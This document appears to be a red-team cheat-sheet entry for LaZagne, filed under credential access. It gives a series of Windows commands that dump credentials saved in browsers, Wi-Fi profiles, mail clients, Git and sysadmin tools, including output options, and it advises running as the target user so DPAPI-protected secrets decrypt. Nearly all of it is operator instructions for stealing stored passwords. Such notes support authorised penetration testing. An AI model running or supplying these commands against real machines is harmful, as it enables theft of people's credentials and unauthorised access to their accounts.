---
technique: LaZagne
category: credential-access
targets: Browsers, Wi-Fi, Mail Clients, Sysadmin Tools
protocols: Local
remote_capable: false
tags: windows credentials lazagne browsers wifi sysadmin-tools
---

# LaZagne

LaZagne extracts credentials saved by browsers, Wi-Fi profiles, mail clients, databases, Git, and sysadmin tools. Run under the target user context when possible so DPAPI-protected application secrets can decrypt cleanly.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| User context | Many secrets decrypt best under the user that saved them |
| Administrative rights | Some modules need elevation for full coverage |
| Output control | Prefer explicit output formats when collecting results |

## Windows

### Run all modules

#cmd #lazagne

Run every Windows LaZagne module.

```cmd title:"Run all LaZagne modules"
lazagne.exe all
```
<!-- cheat -->

### Verbose all modules

#cmd #lazagne

Run every module with verbose output.

```cmd title:"Run all LaZagne modules verbosely"
lazagne.exe all -v
```
<!-- cheat -->

### Write normal output

#cmd #lazagne

Write LaZagne results in normal text format.

```cmd title:"Write LaZagne normal output"
lazagne.exe all -oN
```
<!-- cheat -->

### Write JSON output

#cmd #lazagne

Write LaZagne results in JSON format.

```cmd title:"Write LaZagne JSON output"
lazagne.exe all -oJ
```
<!-- cheat -->

### Browser credentials

#cmd #lazagne #browsers

Run browser credential modules.

```cmd title:"Run LaZagne browser modules"
lazagne.exe browsers
```
<!-- cheat -->

### Windows credentials

#cmd #lazagne #windows

Run Windows credential modules.

```cmd title:"Run LaZagne Windows modules"
lazagne.exe windows
```
<!-- cheat -->

### Wi-Fi credentials

#cmd #lazagne #wifi

Run Wi-Fi credential modules.

```cmd title:"Run LaZagne Wi-Fi module"
lazagne.exe wifi
```
<!-- cheat -->

### Sysadmin tool credentials

#cmd #lazagne #sysadmin

Run modules for saved credentials in sysadmin tools.

```cmd title:"Run LaZagne sysadmin modules"
lazagne.exe sysadmin
```
<!-- cheat -->

### Git credentials

#cmd #lazagne #git

Run Git credential modules.

```cmd title:"Run LaZagne Git module"
lazagne.exe git
```
<!-- cheat -->

### Mail credentials

#cmd #lazagne #mail

Run mail client credential modules.

```cmd title:"Run LaZagne mail modules"
lazagne.exe mails
```
<!-- cheat -->

## Linux

No Linux operator command is included here. This note covers Windows LaZagne usage.
